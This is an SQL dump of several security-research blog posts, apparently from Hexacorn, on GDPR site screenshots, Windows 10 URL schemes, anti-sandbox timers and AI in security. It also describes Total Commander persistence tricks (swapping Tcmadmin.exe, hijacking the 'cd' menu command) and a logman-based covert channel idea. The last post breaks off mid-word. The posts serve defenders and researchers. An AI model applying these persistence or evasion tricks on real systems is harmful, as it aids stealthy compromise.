INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1, 'Permanent Link to It’s understood… that EU dudes… sell GDPRization…', 'Hexacorn', 'June 28, 2018 ', 'I’ve been recently thinking of GDPR, and its influence on the non-EU websites… in particular, I was curious how the legislation affects the user experience for non-EU sites for visitors from EU. We hear about many websites in US simply denying the access e.g. LA Times:\n\nbut I was curious how many other web sites really do so…\nI came up with a quick & dirty (and pretty simple) idea of checking how the popular web sites respond to the regulation… by visiting them and taking a screenshot.\nOf course, manual check would be too labor-intensive, so I automated it.\nFirst, I needed a list of top world web sites so I downloaded the Cisco Umbrella list. I know it’s biased, but don’t know any better source (since the  free Alexa top 1M is long gone, and others – I really don’t know how accurate they are).\nI then created a simple script in perl to extract the first 10000 top unique domains from the list (and exclude all subdomains on the way):\nuse strict;\r\nuse warnings;\r\nmy %h;\r\nmy $cnt=0;\r\nwhile (<>)\r\n{\r\n  if (/,([^\\.]+\\.[^\\.]+$)/)\r\n  {\r\n    if (!defined($h{$1}))\r\n    {\r\n      print \"$1\";\r\n      $h{$1}++;\r\n      $cnt++;\r\n      exit if $cnt >= 10000;\r\n    }\r\n  }\r\n}\r\n\nNext, I wrote a simple phantomjs script to grab a screenshot of these domains (all accessed via http and then rerunning for https for these that didn’t work):\nsystem = require(\'system\')\r\nvar page = require(\'webpage\').create();\r\n     page.viewportSize = { width: 1024, height: 768 };\r\n     page.clipRect = { top: 0, left: 0, width: 1024, height: 768 };\r\naddress = system.args[1];\r\noutput  = system.args[2];\r\npage.open(address, function() {\r\n  page.render(output);\r\n  phantom.exit();\r\n});\r\n\nAnd then I ran the phantomjs on domains from this data set… each page visited is saved as a png.\nTo my surprise, the experiment didn’t work as I anticipated.\nMost of web sites visited didn’t really make any comment on GDPR and it was business as usual. Some offer an option to accept new privacy policies. In the end I only came up with a bunch of examples.\nStill, it was worth trying…\nLessons learned…\n\nSome web sites detect phantom JS as a bot – they will block your IP, or offer a captcha challenge\nLots of top domains don’t even host a web site; you can see default IIS, Nginx pages, errors (404, 403s ;))\nPrivacy banners, if they exist, are handled in many different ways – from simple OK, to more advanced settings with a multi-choice questionnaire; I include some example below\nMany non-English web sites provide information about privacy in their native language; this is an interesting conundrum to solve in general – how a non-speaker can use the web site w/o an ability to understand the Privacy Policies? I provide some examples in French, Italian and Dutch (and of course, English)\nWay too many advertising and marketing web sites, all united to promise you the best monetization ever; and yes, AI-based advertising is already here \n\nI am wondering if the methodology I used was incorrect? Perhaps it would be faster to just query google for all the web sites that refer to GDPR? I couldn’t come up with a good google dork though. And searching still brings many of such geo-locked web sites and include them in ‘normal’ results. You only learn about GDPR stuff when you try to visit the actual page. Google cache is still available though in some cases. So… I guess this transitional stage will last for some time. If you have any idea on how to run a research like this better, please let me know.\nAnd finally some screenshots\ndiynetwork.com\n\ngoodrx.com\n\nchicago tribune\n\nCollect and gather\n\nEverquote\n\nFubo.tv\n\nGannet\n\nOrlando Sentinel\nPandora (not sure if it is GDPR related though)\n\nMyspace\n\nEbates\n\nEuropean Union page itself\n\nAtlas Obscura\n\nAt Hoc\n\nCosmopolitan\n\nMy recipes\n\npiwikpro\n\nSimpsons World\n\nLe Monde\n\nMeteo IT\n\nNOS\n\nAnd finally NSFW, all the screenshots related to porn.\nShare this :)', 'GDPR, Silly, Trivia', 'http://www.hexacorn.com/blog/2018/06/28/its-understood-that-eu-dudes-sell-gdprization/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (2, 'Permanent Link to URL schemes in win 10', 'Hexacorn', 'June 25, 2018 ', 'I was casually browsing the Regedit today (as you do) and noticed that the latest version of Windows introduced a lot of new URL schemes. I decided to extract all of them from the HKCR node and just drop them in one post. Googling around I couldn’t find similar list, so there you go…\nThere are nearly 200 of them… Historical evidence (lots of CVEs related to protocol handling) makes me believe there are possibly plenty of bugs waiting to be discovered in these.\nClick the links and see what you get on your Win10 – not all of them will work obviously as they may not be ‘launchable’ from the browser, or maybe requiring proper arguments, but you can also use start command to automate it (start <protocol>).\nHere’s the list:\n\n\n\narmodelviewing\naudiocall-messenger\naudiocall-skype-com\nbingfinance\nbingfoodanddrink\nbinghealthnfitness\nbingmaps\nbingmoney\nbingnews\nbingsports\nbingtravel\nbingweather\ncalculator\ncallto\ncandycrushsodasaga\ncom.microsoft.3dviewer\ncom.microsoft.builder3d\ncom.microsoft.print3d\nDLNA-PLAYSINGLE\nExplorer.AssocActionId.BurnSelection\nExplorer.AssocActionId.EraseDisc\nExplorer.AssocActionId.ZipSelection\nExplorer.AssocProtocol.search-ms\nExplorer.BurnSelection\nExplorer.EraseDisc\nExplorer.ZipSelection\nfb336512696486951\nfb659670967393166\nfeedback-hub\nfile\nftp\nhttp\nhttps\nhx-accounts\niehistory\nierss\ninsiderhub\nLDAP\nmailto\nmapi\nmaps\nmessage-messenger\nmessage-skype-com\nmicrosoft-edge\nmicrosoft-edge-holographic\nmicrosoft.windows.camera\nmicrosoft.windows.camera.picker\nmicrosoft.windows.photos.crop\nmicrosoft.windows.photos.picker\nmicrosoft.windows.photos.videoedit\nMicrosoft.Workfolders\nmicrosoftmusic\nmicrosoftvideo\nmk\nMMS\nms-aad-brokerplugin\nms-actioncenter\nms-appinstaller\nms-apprep\nms-availablenetworks\nms-call\nms-callrecording\nms-chat\nms-clock\nms-contact-support\nms-cortana\nms-cortana-ainotebook\nms-cxh\nms-default-location\nms-device-enrollment\nms-drive-to\nms-edu-secureassessment\nms-gamebarservices\nms-gamingoverlay\nms-get-started\nms-getoffice\nms-inputapp\nms-ipmessaging\nms-ipmessaging-name\nms-mail\nms-mmsys\nms-msdt\nms-officeapp\nms-oobenetwork\nms-paint\nms-penworkspace\nms-people\nms-phone-companion\nms-photos\nms-playto-miracast\nms-projection\nms-quick-assist\nms-retaildemo-launchbioenrollment\nms-retaildemo-launchstart\nms-set\nms-settings\nms-settings-airplanemode\nms-settings-bluetooth\nms-settings-cellular\nms-settings-connectabledevices\nms-settings-displays-topology\nms-settings-emailandaccounts\nms-settings-language\nms-settings-location\nms-settings-lock\nms-settings-mobilehotspot\nms-settings-notifications\nms-settings-power\nms-settings-privacy\nms-settings-proximity\nms-settings-screenrotation\nms-settings-wifi\nms-settings-workplace\nms-sttoverlay\nms-sway\nms-taskswitcher\nms-unistore-email\nms-virtualtouchpad\nms-voip-call\nms-voip-video\nms-walk-to\nms-wcrv\nms-windows-search\nms-windows-store\nms-windows-store2\nms-wpc\nms-wpdrmv\nms-xbl-3d8b930f\nmsnfinance\nmsnmoney\nmsnnews\nmsnsports\nmsnweather\nmswindowsmusic\nmswindowsvideo\nodopen\nonenote\nonenote-cmd\noutlookaccounts\noutlookcal\noutlookmail\nprofile-facebook-com\nprofile-google-com\nprofile-linkedin-com\nprofile-lync-com\nprofile-messenger\nprofile-outlook-com\nprofile-skype-com\nprofile-twitter-com\nprofile-weibo-com\nprofile-yahoo-com\nread\nres\nrlogin\nsearch\nsearch-ms\nskype\nskypepage\nskypeproxy\nskypesettings\nskypesetup\nskypeuwp\nskypewin\nsms\nStickyNotes\nstritz\ntbauth\ntel\ntelnet\ntn3270\ntwitter\nvideocall-messenger\nvideocall-skype-com\nwindows-feedback\nwindows.tbauth\nwindowsdefender\nwindowsreadinglist\nwlcalendar\nwlpeople\nWMP11.AssocProtocol.DLNA-PLAYSINGLE\nWMP11.AssocProtocol.MMS\nxbls\nxbox\nxbox-arena\nxbox-captures\nxbox-friendfinder\nxbox-gamehub\nxbox-lfg\nxbox-network\nxbox-profile\nxbox-settings\nxbox-store\nxbox-tcui\nxboxgames\nxboxliveapp-1297287741\nxboxmusic\nzune\n\n\n\nShare this :)', 'Windows 10', 'http://www.hexacorn.com/blog/2018/06/25/url-schemes-in-win-10/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (3, 'Permanent Link to Coalescable Timers – yet another possible anti-* API', 'Hexacorn', 'June 16, 2018 ', 'I was reading about coalescable timers today and it occurred to me that:\na) there is not that much info about them online\nb) I have not seen them being mentioned in a context of anti-* evasion (sandbox, reversing).\nQuick googling didn’t bring many results, so I guess I will make a note here.\nWhat are Coalescable Timers?\nThey are not that much different from your regular timers that one can set up using the SetTimer function, except they allow the processor(s) to better manage the resources. Basically, if you have a bunch of software that uses timers, they will end up being quite noisy and will keep popping up forcing the processors to exit the idle mode (so that the software can handle these events).\nMany apps don’t really need precise timers that badly; they are often more interested in doing something every once in a while, but very precise intervals between these activities are really really rarely needed. And such regular ‘attention seeking’ is quite expensive, especially for portable devices that need to preserve the battery. So the idea is that instead of using such demanding timers one can set up a timer that can be triggered with a bit of a delay. This way, processor seeing a number of timers triggering can combine all of these falling within a certain threshold into a single event that can notify all the software ‘looking for the attention’ at once. I am simplifying it, but that’s more or less the idea.\nThe concept is good, and there is an API for it.  It is called SetCoalescableTimer and is present in Windows 8 and Windows Server 2012. Quick look at its implementation shows that it’s just a redirected call to… NtUserSetTimer inside the ntdll.dll. Notably, there is also a kernel function KeSetCoalescableTimer.\nAnd here’s the funny bit.\nThe SetCoalescableTimer is a true Schrödinger API – it is both documented (I provided the link to MSDN above) and not (most of the information I could find leads me to believe that the proper way to use coalescablee timers is to rely on a completely different API: SetWaitableTimerEx! And this one was available in Windows 7 and Windows Server 2008 R2). Most likely someone let the SetCoalescableTimer out of the bag and now it’s there for anyone to abuse it. At the moment even Windows 10’s Windows Explorer is using it, so it’s probably not going away that soon…\nShare this :)', 'Anti-*, Sandboxing', 'http://www.hexacorn.com/blog/2018/06/16/coalescable-timers-yet-another-possible-anti-api/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (4, 'Permanent Link to The botryology of anomalies – the AI, machine learning and ze computer security', 'Hexacorn', 'June 16, 2018 ', 'Disclaimer: I am not an AI/machine learning expert. I am not even a noob. I did study computer science in the past and have a rough idea how it works. I also spent some time recently reading about it to ensure I do understand at least the basics. If you spot any mistakes, or logical fallacies, please let me know.\nThrow rotten tomatoes, but have a good reason to do so!\nThank you!\nTL;DR; Anyone claiming their product uses AI/machine learning and with that can protect you better than any other technology, and in particular – by replacing that ‘old’ technology – is usually not telling you the whole truth.\nThe AI and machine learning suffer from the marketing buzz more than any other popular keywords like e.g. blockchain, or cryptocurrency. The reason for this state of affairs is that the AI term itself has been with us for a very long time. Plus, the ‘intelligence’ bit in it establishes a very strong link between what we understand is a unique feature of a human mind with the machine abilities to do the same. Then there are movies that completely distort the picture. If machines can think, we are doomed.\nSeriously…\nThe funny thing is that AI/machine learning is nothing, but a computer program. Only when you reduce it to just that, i.e. a piece of code written by some guy or a team it becomes easier to spot its caveats. Obviously, if more and more devices in a physical world are  controlled by the (buggy/error-prone) AI-driven software we may in the end self-destruct, but… instead of talking about that ultimate apocalypse, let’s try to focus on a ‘simple’ problem facing computer systems for last 30+ years:\n\nis the object (file, URL, attachment, etc.), user’s behavior, or set of events observed in the environment bad, or good\n\nThe question is simple to ask and is actually the core of any AI design:\n– we need to state the problem first before we can try to solve it.\nWhile many companies claim to be using AI in their products I find this statement questionable. I may be wrong, but when I first learned about AI I did so in a context of data classification and decision making; even on that very basic intuitive level I always felt that the role of AI system is primarily to classify objects into groups/clusters more than to make a strict binary determination or precise decision. Perhaps AI progressed beyond the scope of my understanding, I don’t know. And of course, AI _can_ and _does_ make binary decisions in some cases, but these decisions are usually taken within a very strictly codified ‘gray area’ that is somehow arbitrarily defined, and carefully controlled. As such, an algorithm that tries to distinguish between a picture of a turtle and a marigold flower can certainly be trained to do so pretty well, you can certainly use AI to compare an incoming data set against your database of features (e.g. facial recognition and ID-ing people), but you can’t compare against the unknown. Same goes for a self-driving car where there is no suspicion of any of the sensors providing malicious input data.\nThe last bit is actually of paramount importance; if someone controls the input, the system will make bad decisions (bias introduced this way can destroy AI – abusing the learning process, and decisions that are made based on the incorrect model built on incorrect / poisoned data, but not only that – also on the real-time input to the AI from the analyzed system that can be manipulated).\nThe bottom line is my hypothesis that the clear-cut binary distinction between a goodware, and badware, or bad action vs. good action is still pretty much impossible today.\nThe security companies don’t lie 100% when they claim they use AI though. What they usually rely on is an implementation of so-called fuzzy logic which is a code with a crazy number of parameters retrieved from various sensors/routines, each with their own weight, and encapsulated in their software with the tones of the if/then/else statements, and some magic formulas. They do pretty well, but they are nothing but simple heuristics e.g.:\n\nif it contains unknown PE section name -> claim it’s a possible malware\nif hash is unknown in the cloud -> claim it’s a possible malware or it is ‘suspicious’\nif entropy of the .data section differs from a ‘norm’ -> flag it; and\nthey do use lots of conditional IOC- (yara) or hardcoded artifact names-based statements, etc. e.g.\n\nif it contains keylogging API that is unusual in most of the programs -> flag as a possible keylogger; and you can actually generate a lot of good rules from a large corpora of malware…\n\n\n\nBut is this a real AI tho?\nI have my doubts.\nRemember that first AI anti-malware software didn’t even know of existence of PE format, let alone its 64-bit version, and then additional complexities introduced by .NET, and Metro applications, let alone new platforms like Android or iOS + a massive list of hacking tricks that can be only observed via a very thorough EDR or auditing. It doesn’t learn on its own to extract new properties or understand new formats, unless you somehow codify it (one can argue there is always a way to feed new file formats or input as they become available, but …). If the AI algo can get an unstructured data set and make good decisions based of it then I will be the first one to convert and become a robot’s slave…\nHypothesis: AV systems can be evaded easily, and same applies to AI.\nProof?\nSame as with AV – by examples.\nLet’s assume first that the AI system has almost an infinite, omni-seeing ability to collect any possible information from the observed system. It’s a nonsensical utopia, but helps to set up a stage for the borderline thought experiments that follow.\nImagine an insider threat that deals with a customer list and wants to steal it from the system. AI observes this person’s every move. The user accesses the database of clients on regular basis. The only difference between the 2 distinctive paths AI observes between your average day and the day when the user steals the data is when the user takes a photo of the screen with the smartphone and causes a slight, yet negligible delay between the time subsequent keys (that are part of a normal working day) are pressed.\nObviously, using external devices is a cheat, but it highlights the fact AI can only ‘see’ what the system can see – the threat of using an external device that is not connected to the system to take a stupid photo doesn’t disappear. Of course, one could always argue that if AI ‘sees’ everything, there is a cam on that computer that monitors the user all the time and spots the object pointing at the computer screen, identifies it as a smartphone, and not only that – it can distinguish that it was out there to take a photo+confirms it actually happened+can ID the user.\nGood luck with that. Also, AI clearly doesn’t care about GDPR, remote desktop access, fake cam feeds, or a sticker on the camera that is there since the day employee was hired… So many ‘ifs’.\nLet’s look at another example.\nThe very same insider starts sending emails with some random data to a newly established email. If asked, says it’s for a testing purposes. Who wouldn’t trust them? AI observes it all and after a while gets used to emails that don’t carry any risks and possibly whitelists the ‘test’ email (especially if SOC analysts who investigate the first 20 alerts tick the ‘not a threat’ box that will provide an important human feedback to the AI system; Assisted Learning helps, right?). Then one day the real data starts being sent out, or better – chunks of it, hidden in the test data; only the thief knows how too interpret it. Same format as test data. From the very same source from which the test data was sent for months and was marked ‘non-threat’. There is a very high chance that the AI system will miss it, and even if it flags it, it will be dismissed ‘based on the history’. And to your possible point – AI could obviously spot the user ‘manufacturing’ the data he plans to steal; what if he used exactly same process of inputting test data as with the stolen data? There is a bit in the cycle that can’t be monitored – a human memory and intention. Besides, AI needs to be flexible; human is not a machine and there will be deviations observed that need to be dismissed. Ruling them out, even from a monotone cycle of some of the jobs e.g. in the call centers is definitely non-trivial.\nThe concept of active malicious training of AI to ingest a stream of legitimate events, then slowly accept small pattern changes is very tempting and I think crucial to understanding how difficult these binary decisions are. The naive mind will always focus on how the bad activity stands out in a typical hack scenario, forgetting that it is usually the small changes that get unnoticed for a very long time (think: salami attack). And let’s not forget there are e.g. 50000-100000 employees to monitor at any point of time in a large company+show me the company where you have controls covering everything 100%… Alert fatigue is visible today even with relatively simple DLP alerts; if AI starts flagging more events your SOC will quickly be outnumbered…\nOkay, maybe still far-fetched. Let’s look at malware samples.\nAn example sample is an installer of new version of 7Zip detected to be downloaded by an user. AI saw similar downloads before and they were deemed to be legitimate. When executed setup files use the Nullsoft Installer that simply drops files on the system. AI is already trained on Nullsoft installers and knows that in most cases it is a good installer used primarily for non-malicious purposes. It does know of course that some malware did abuse it in the past as well (including e.g. bundled adware). So any execution is carefully monitored. The AI doesn’t know tho that the malware got introduced via a supply chain attack and the installer downloaded from the web site this time already contains malware that is present in the final 7z.exe. Obviously, AI may pick up some funny activity later on from the infected 7z.exe, but have you noticed that the integrity of the system has been already compromised? Will you detect it with AI at the time of download/infection? or only when it actually collects and exfiltrates data? The difference is actually quite substantial. I am personally very strict (at least in theory) when it comes to a definition of an incident. If any of the C(onfidentiality), I(ntegrity), or A(vailability) is affected, it is already an incident. You do want to prevent every single one. Having a malicious software installed on the system and ready to go is to attackers’ advantage. Even if you start reacting to it quickly – that important data might have already left the network… IMHO race conditions like this are the future of many attacks. This is not that far from the concept of Core Wars…\nWe can also dig deeper into a Portable Executable format – e.g. we can ask if static file analysis enough to determine if the file is malicious?\nI think it’s not.\nIt’s so easy nowadays to come across malware that is signed using stolen certificates, there are documented examples of malicious hash collisions.  Many malware authors use advanced techniques of code obfuscation that leverage existing code repositories of ‘real-world’ code snippets. They use them to do a code-injection on a source level so that malware resembles real software after compilation. Given the progress in decompilation, the idea of a generic code integration is also much closer than before. And there is not a single PE file property (or their group) that can be today used to distinguish a badware from goodware on a file level. Of course, you will always find lots of stupid malware that still uses old protectors, hides its code under UPX, uses randomly named PE sections, use PE format tricks to evade analysis, connects out immediately after it runs, but for this you don’t even need AI…this problem is actually already solved. IMHO… for anything a bit more advanced static analysis and simple emulation are not enough…\nThe sandboxing and dynamic analysis are actually very efficient nowadays, but then again – also prone to errors. I can’t imagine a modern AI system that would not reach out to some sandbox technology to support its judgment. Which obviously leads us to the topic of sandbox evasions. Again, to believe that AI can always pick up the bad behavior from sandbox analysis is simply naive (the usual suspects include: missing command line arguments, dependency on other files, run as a service, run from a specific location, providing input data, and any other anti_* tricks – whether intended, or not, etc.). And besides, to rely on the input of sandbox is very non-AI approach after all. Isn’t it?\nSo, say you got a file, you calculate a hash, if it is known and clean (reputation check), it’s OK. If it is not, you dig deeper – run static (file properties analysis/emulation)/dynamic analysis (sandbox). If bad stuff detected at any stage via IOC/yara, you mark it. If not, what do you do? You rely on your AI model. Which is a bunch of ifs. And since AI is just a program, as for any code… there is an exit path in that process that says ‘undetermined’. The program runs on the system. System pwned…\nAnd in this context we do need to mention legitimate software doing lots of dodgy stuff. Legitimate software calling cscript, mshta, powershell, injecting code into Windows Explorer to delete files (older installers), word/excel with embedded batch files, direct, clickable links to shares where the batch files reside, etc. and often executed in a way that is clearly malicious (well, but is it?) – at least from a typical threat hunting signature-based perspective. Plus, there is an ongoing and very active  research on LOLbins – Living of the land binaries that can be used to carry on some malicious activities. Is running Lolbins suspicious? How can you tell, AI?\nAs I often repeat – anomalies are hard to define+we end up doing signatures! Oh, no… not again!\nAnd yes, AI could come up with the model of determining some of these anomalies to be bad, but mind you – some Enterprise solution’s approach to running e.g. powershell snippets is identical with malware.\nAnd coming back to AI bias… Remember what I said about the user controlling the input? It’s a bit like a web pentesting; if user can control the input, you better be very careful… And on any system monitored by AI user is the king. They may not be able to run a lot of software, they may not have an admin, or system account, but they can do dodgy stuff that stays under the radar for a very long time. Because they control the input!\nI think there is a vast, unexplored area of research into generating streams of legitimate or legitimately-looking events that will help to train AI systems to… ignore certain types of events. The research may be threat-, vendor- or product-specific, but if it does achieve the AI bypass, then that’s pretty much the game over for any system protected with your ‘AV-replacement’ Next Gen product.\nAnytime someone claims they can bypass a product, or an idea the good ol’ defense-in-depth concept comes back to my mind. You just can’t simply rely on that one, new, and ‘almighty’ security control. You can’t rely on their classification/decision process either – AI or not. The redundancy in detection ideas, and/or security controls is to our benefit. It costs more short term, but it costs less long-term. And on that note, one of the Holy Grails for any blue team should be detection of legitimate pentesting activity. If you can’t even detect that with your latest and ‘bestest’ AI technology you do need to ask yourself some serious questions…\nLast, but not least – the AI has to deal with a crazy amount of ambiguity ‘by default’, and where there is ambiguity, the bad decisions will _always_ be made. So, now we not only “trust, but verify”, but “trust, verify, and rely on redundant security controls and threat hunting ideas to avoid surprises of these bad decisions made by some of the blindly-trusted controls – and either prevent, or detect as early as possible…”.\nI once attended an interview (in the very early stages of my career); the guy asked me – am I 100% sure that I can do the job w/o someone needing to review and reassess what I have done, and possibly correct me. It really shocked me – he assumed I may be a subject to a failure! Only later I realized that it is a very mature question; if you can’t be 100% sure, please do not claim it. And the trust… same as entitlement need to be earned first. As such, we can’t trust AI models today – you need to review!!!\nAI and machine learning are very interesting, and promising ideas, but at the moment they are still in the ‘wishful thinking’ bucket. They should not be sold as a replacement to an existing technology, but as a carefully monitored add-on. Otherwise it’s just insincere, and as I mentioned, yes, it actually should add more work to your workload before you can actually trust it!\nComing to an end of this preaching session. I think what I want to highlight the most is probably the fact that all the AI-oriented marketing materials focus on the cases where it works. And this is great. But… that’s the biggest problem.\nOnly a few days ago Halvar Flake released a very interesting preso about the state of the RE tools and their ‘marketability’. I really like the slide where he states ‘Tools are written for a paper / presentation’:\n As of 2018… so are… enterprise AI-based security solutions.\nAnd to close this awful preaching session, I must admit that I really liked FireEye’s article about ‘Reverse Engineering the Analyst: Building Machine Learning Models for the SOC‘. This is a very good example of Machine Learning being presented in a very practical way, and as one of the available tools to support our work. And this is I guess the goal of all this AI/ML buzz: use it to reduce the data to clusters, but still… let us make that binary decision ourselves!\nShare this :)', 'AI/ML, Preaching', 'http://www.hexacorn.com/blog/2018/06/16/the-botryology-of-anomalies-the-ai-machine-learning-and-ze-computer-security/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (5, 'Permanent Link to Beyond good ol’ Run key, Part 79', 'Hexacorn', 'June 10, 2018 ', 'This persistence post targets users of Total Commander (TC).\nI love TC and have been using it for many years. Quite frankly… I really can’t imagine working on Windows w/o using this tool, and I really pity anyone who is using Windows Explorer either by choice or by force. The other good alternative to TC is FAR, but its far (unintended pun) less popular, and definitely not present in the corporate environment as much as TC…\nAnyway…\nBeing so popular makes TC an obvious target and since it has such a rich functionality it’s very easy to abuse these features to stay on the system persistently.\nThere are many ways to do it… I doubt I can cover all of them, but let’s jot down some notes:\n\nThe system of plug-ins is an easy target, so I will skip its description as it’s boring (okay, you just drop a DLL into TC’s plug-in directory and ensure it’s registered to handle some filetypes, of viewer, etc.). These are officially supported plug-in types:\n\nPacker Plug-ins\nFile-system Plug-ins\nLister Plug-ins\nContent Plug-ins\n(note that existing plugins can be swapped, or be a subject to side-loading issues, etc.)\n\n\nNot many people know about it, but the TC accepts command line arguments, including:\n\n/i=name.ini – a different location of wincmd.ini file; a changed .ini file may include some extras\n/INSTALLDRIVERQ- installs ‘cglptnt’ service pointing to C:\\WINDOWS\\system32\\DRIVERS\\cglptnt.sys that is copied there by TC – this file could be swapped\n\n\nThe next one is one that I kinda like as an idea as it’s quite subtle\n\nTC offers a really cool functionality that allows you to quickly ‘jump to the directory’ from the menu\nThe function is activated by the CTRL+D keyboard shortcut\nThe actual ‘jump’ is implemented via a ‘cd’ command, so every new directory added to the menu will have a Command set to ‘cd <directory’:\n\nYou can change this ‘cd’ command to e.g. c:\\windows\\system32\\calc.exe\n\nNext time someone attempts to change the directory to Windows, the calculator will be spawn:\n\nThe caveat is that the directory itself is not changed in such case – I guess malware could send that sequence of keys to TC to force the directory change or simply modify the entry back to its original content and user would be none the wiser – the command would work the second time they try; since it’s not a typical persistence (it only works when the menu is used), it could be used as a ‘backup’\n\n\nThe TC can handle some UAC kinda graciously\n\nFor example, if you want to enter c:\\Windows\\CSC directory, you will get this message box:\n\nHitting ‘As Administrator’ will engage Tcmadmin.exe program that is located in the TC program directory; swapping this program with your own will make TC launch your own program anytime it handles UAC business\n\n\n\nThere are probably many other ways… and as a side note, since TC includes a native client for (S)FTP, it can be used to download/upload stuff as well…\nSo, in a way, TC is an ultimate… LOLBIN.\nThere you have it… but want to emphasize one thing – this post is not to scaremonger  you – TC is awesome and consider purchasing it, and… keeping an eye on its config files…\nShare this :)', 'Autostart (Persistence), Living off the land, LOLBins', 'http://www.hexacorn.com/blog/2018/06/10/beyond-good-ol-run-key-part-79/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (6, 'Permanent Link to Logman, the Windows volverine', 'Hexacorn', 'June 9, 2018 ', 'Update\nCoincidentally, @HECFBlog @nicoleibrahim released a tool ETL Parser that helps to at last extract raw buffers and as a result it produces a CSV file with data that can be analyzed row by row. This is the closest so far that I have seen for a tool to be able to help analyze the output of api trace log. Have a look at the screenshot:\n\nOld Post\nAlmost everyone is excited about .etl files that are produced as a result of Event Tracing for Windows.\nAlmost, because not me.\nThis feature is so rich in … features. Except it’s only for MS internal consumption. At least, it seems to be the case in some very really interesting… well… cases…\n…\nIt all started when I looked at the logman tool command line arguments; one that immediately caught my attention was this one:\nlogman create api\nAha… A basic API Monitor!\n\nBut not only that. It allows to run API Monitoring across different systems!!!\n\nOh… this could be a nice covert channel to transfer data between systems. Write one piece that constantly calls a monitored API and feeds it with the data to transfer, and then – on the other end – collect this data on the other system using logman tool. You could definitely implement it in a duplex set-up too.\nSimple.\nSo I thought.\nFirst, I immediately tested the ‘create api’ bit it and it worked like a charm:\nlogman create api foo -f bincirc -exe c:\\windows\\notepad.exe -o c:\\test\\notepad.etl\r\n\r\nlogman start foo\nNow you have to simply run Notepad.exe (c:\\windows\\notepad.exe) and the .etl log will be created&updated as long as notepad.exe runs; the example content of the binary .etl file is as follows:\nYou can clearly see the APIs being recorded when Notepad is running:\n\nRegisterClassW with the Unicode class ‘OleMainThreadWndClass’\nGetAppCompatFlags2\nIsProcessDPIAware\nGdiReleaseDC\netc.\n\nThe only problem remaining:\n– how to convert this binary blob into something more readable?\nAfter googling around, I discovered that the tool basically embraces the api tracng functionality offered by the IApiTracingDataCollector interface. When you read into the docs of this interface you will soon realize that logman’s command line argument ‘-f’ that is supposed to determine the file type for the output file can be only… binary. So any attempts to specify TSV, or CSV will fail \nOkay.\nSince I couldn’t bite it from this end, I started looking at Windows Performance Analyzer (WPA) and other tracing and trace conversion tools.\nNo matter which one I used, I could only get a basic flow of the events, but w/o these interesting gore details of each API call:\n\nIt’s all nice and eye candy, but the problem is already visible:\n– if you don’t know how to parse, you simply don’t.\nAs a last resort I tried ‘tracerpt’:\ntracerpt <log> -o <output> -of CSV\n.. and it provided a similar enigmatic output:\nSome more googling around and now I know I need to get a .PDB file for the api trace provider, or some other schema files that will allow WPA to parse it properly…\nSigh…\nThe provider’s GUID is 7535aef9-4a3b-482b-91eb-25db0299995d.\nIt is nowhere to be found.\nEventually I gave up & I asked on Twitter.\nUnfortunately, Alex Ionescu, and Zac Brown are both pessimistic  Still, I am grateful to them for chipping in and providing the useful feedback – if they can’t do it, I guess we explored all the ‘normal’ possibilities.\nBut then I am thinking… so… if it is an internal schema, then there is only one way out.\nBrute-Force attack.\nI may cover it in the next post.\nFrom the blue team’s perspective, if you want to detect logman’s activity, in particular api tracing, you may be interested in this process tree:\n\nThe example command line arguments from my VM test run are as follows:\n\nC:\\Windows\\system32\\svchost.exe -k netsvcs\n\ntaskeng.exe {A7B77AA7-00E9-45C4-92C5-31C3868DB30D} S-1-5-18:NT AUTHORITY\\System:Service:\n\nC:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\pla.dll,PlaHost “foo” “0x934_0x91c_0x2a045dff88a”\n\n\n\n\n\nOne thing is also worth mentioning – many logman command line option talk about running some task when some event happens; at first I thought it may be a new persistence mechanism, until I realized the tasks names required by these commands are task names registered using a Task Scheduler. So… yet another fail on the documentation, as it is very cryptic and talks about these various traces in a very superficial way \nShare this :)', 'Malware Analysis, Undocumented Windows Internals', 'http://www.hexacorn.com/blog/2018/06/09/logman-the-windows-volverine/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (7, 'Permanent Link to Enter Sandbox – part 17: The clique of clickers', 'Hexacorn', 'June 8, 2018 ', 'Every sandbox needs to click stuff. Let it be ‘Next’, ‘Finish’, or ‘OK’ button – when the sample runs and the GUI shows up these buttons must be simply pressed somehow to ensure the execution continues.\nWriting a clicker tool that handles it smoothly is not a trivial task.\nFirst, it has to click only windows that are created by new processes – this can be kinda easily achieved by PID filtering f.ex. based on a process snapshot obtained prior to launching the sample, but don’t be fooled – the OS message boxes, or running services or programs may sometimes require additional clicking that are ‘out of band’ (e.g. hard error messages from csrss.exe process). There may also be some issues if sandbox tools don’t handle errors silently (e.g. exceptions in .NET tools).\nNext, the actual clicking…\nOh boy… this is a tricky one…\nDo we send a keyboard event, or mouse event?\nDo we even know where the actual button we must click… is?\nFor installers that rely on Windows GUI system to draw its components – it’s quite easy. Every sych GUI control is a separate window which we can enumerate, find, inspect its class name, text and, send a message to, if we need to. Unfortunately, the generic solution is much harder to write, because:\n\nBorland/Delphi/Embarcadero etc. use VCL and its own components (and programmers often created their own libraries with dedicated owner-drawn controls – this was really popular in late 90s and early naughties)\n.NET uses its own components (Read about Windows Presentation Foundation (WPF))\nOffice uses its own GUI components (forms, etc.) – read about UI automation below and about Office UI Fabric\nJava uses its own components; many testing frameworks rely on access to the source code (from what I learnt so far), so it’s hard to do a blackbox test\nAdobe Flash and Silverlight are also custom drawn, same as Google Chrome, Mozilla Firefox and many other software packages may and often do use their own GUI libraries\nSome (especially old-school) applications use their own components that are proprietary and only known to the software company that produced them, so it’s hard to write a generic clicker for them (Lotus Notes anyone?)\nThen there are CLI tools that require manual input; these are impossible to handle in a generic way (interestingly, many executables submitted to VT are student projects and require manual input to produce some results; while not malicious, they pose a significant challenge to sandboxes)\nThe GUI elements can be localized\nThe localization itself is one issue, the other is the fact that localized software, especially the old one, often relies on the old ANSI code pages and ANSI 